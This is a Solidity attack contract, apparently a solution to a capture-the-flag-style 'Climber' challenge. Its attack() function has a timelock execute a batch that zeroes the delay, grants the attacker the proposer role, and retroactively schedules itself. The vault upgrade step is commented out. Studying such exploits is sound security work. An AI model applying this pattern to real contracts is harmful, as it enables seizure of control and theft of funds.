// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "./ClimberVault.sol";


interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttacker {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;
    using Strings for uint256;

    IClimberTimelock timelock;
    address vault;
    address upgrade;

    constructor (address _timelock, address _vault, address _upgrade) {
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
        upgrade = _upgrade;

    }

    function attack() external payable {
        targets.push(address(timelock));
        targets.push(address(timelock));
//        targets.push(address(vault));
        targets.push(address(this));

        values.push(0);
        values.push(0);
        values.push(0);
//        values.push(0);

        salt = keccak256("SALT");

        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this)));
//        dataElements.push(abi.encodeWithSignature("upgradeTo(address)",address(upgrade)));
        dataElements.push(abi.encodeWithSignature("schedule()"));
        //timelock.schedule has to be executed through a proxy (this contract) because the dataElements hashing will never match
        // First I tried to call the schedule function directly but the dataElements passed to schedule was not matching the
        // one passed to execute since the one passed to schedule pointed to itself in an earlier state always :
        //  dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
        //  dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this));
        //  dataElements[2] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt);

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public{
        timelock.schedule(targets, values, dataElements, salt);
    }
}
